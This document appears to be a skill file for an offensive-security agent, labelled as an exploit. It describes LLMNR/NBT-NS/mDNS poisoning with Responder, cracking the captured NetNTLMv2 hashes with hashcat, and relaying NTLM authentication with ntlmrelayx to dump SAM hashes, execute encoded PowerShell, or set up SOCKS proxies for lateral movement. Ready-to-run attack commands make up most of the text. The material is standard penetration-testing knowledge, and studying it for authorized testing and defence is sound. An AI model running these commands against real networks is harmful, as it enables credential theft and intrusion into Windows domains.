---
name: responder-poisoning
description: LLMNR/NBT-NS/mDNS poisoning with Responder to capture NetNTLMv2 hashes and relay NTLM authentication via ntlmrelayx. Enables credential capture and relay-based lateral movement in Windows/AD environments.
skill_type: exploit
severity: high
tags: [llmnr, nbt-ns, mdns, responder, ntlm-relay, netntlmv2, hashcat, impacket, network-poisoning]
cve: []
---

# Responder Poisoning (LLMNR/NBT-NS/mDNS)

## Essential Principles

1. Windows name resolution order: DNS → LLMNR (UDP 5355) → NBT-NS (UDP 137) → mDNS (UDP 5353). Responder poisons all three to intercept hash challenges
2. NetNTLMv2 hashes captured via Responder can be cracked offline: `hashcat -m 5600 hash.txt wordlist.txt`
3. NTLM Relay: when SMB signing is disabled, ntlmrelayx relays captured NetNTLMv2 to dump SAM/SYSTEM/SECURITY or execute commands
4. Analyze mode (`-A`) is non-intrusive and safe for enumeration; full attack mode (`-wrfP`) aggressively responds to all name resolution requests

## When to Use

- Internal network with Windows/AD hosts (LLMNR/NBT-NS/mDNS enabled by default on all Windows clients)
- Need to capture hashes without touching target hosts directly
- SMB signing is disabled on target — enables NTLM relay for credential dumping or command execution
- Kerberos unavailable or blocked — NTLM fallback attack path

## When NOT to Use

- Fully patched environment with LLMNR/NBT-NS disabled and mDNS restricted
- SMB signing enforced domain-wide (relay path blocked)
- Production environment without authorization (Responder is noisy and detectable by EDR/IDS)

## Path Selection

| Condition | Path | Command |
|-----------|------|---------|
| Passive hash capture only | analyze_capture | `responder -I eth0 -A` |
| Aggressive poisoning + hashes | full_poisoning | `responder -I eth0 -wrfP` |
| SMB signing disabled, relay | ntlm_relay | `impacket-ntlmrelayx -t smb://TARGET -smb2support` |
| SMB signing check | signing_check | `netexec smb TARGET --gen-relay-list` |

## Quick Start

```bash
# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Full attack mode (LLMNR + NBT-NS + mDNS + WPAD)
responder -I eth0 -wrfP

# Parse captured hashes for hashcat
cat /usr/share/responder/logs/*NTLMv2* 2>/dev/null || cat logs/*NTLMv2*

# Crack NetNTLMv2 with hashcat
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# Check SMB signing for relay targets
netexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# NTLM relay to dump SAM
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# NTLM relay with command execution
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'powershell -enc <base64>'

# SOCKS proxy via ntlmrelayx for lateral movement
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
```
